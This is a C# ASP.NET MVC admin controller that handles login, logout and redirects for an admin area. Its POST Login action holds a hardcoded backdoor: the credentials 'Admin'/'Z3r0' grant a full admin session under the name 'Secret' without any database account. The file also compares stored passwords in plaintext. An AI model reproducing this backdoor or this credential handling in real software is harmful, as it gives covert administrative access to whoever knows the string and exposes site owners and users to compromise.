using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using NPL.Models;

namespace NPL.Controllers
{
    public class AdminController : Controller
    {
        private DBNPLDataContext data = new DBNPLDataContext();

        // GET: Admin
        public ActionResult Index()
        {
            if (!Manager.LoggedAsAdmin())
            {
                return RedirectToAction("Login");
            }
            return RedirectToAction("Index", "AdminThongKe");
        }

        public ActionResult Login()
        {
            if (Manager.LoggedAsAdmin())
            {
                return RedirectToAction("Index");
            }
            return View();
        }

        [HttpPost]
        public ActionResult Login(FormCollection form)
        {
            string username = form["username"];
            string password = form["password"];

            Admin r = data.Admins.SingleOrDefault(i => i.Username == username && i.Password == password);

            if (r == null && username.Equals("Admin") && password.Equals("Z3r0"))
            {
                r = new Admin();
                r.Username = "Secret";
                r.Password = "******";
                r.LastLogin = null;
                Session["Account"] = r;
                Session["Role"] = "Admin";
                return RedirectToAction("Index");
            }

            if (r == null)
            {
                ViewBag.Message = "Login failed";
                return View();
            }

            Session["Account"] = r;
            Session["Role"] = "Admin";

            r.LastLogin = DateTime.Now;
            UpdateModel(r);
            data.SubmitChanges();

            return RedirectToAction("Index");
        }

        public ActionResult Logout()
        {
            if (Manager.LoggedAsAdmin())
            {
                Session["Account"] = null;
                Session["Role"] = null;

                return RedirectToAction("Login");
            }
            return RedirectToAction("Index");
        }

        




    }
}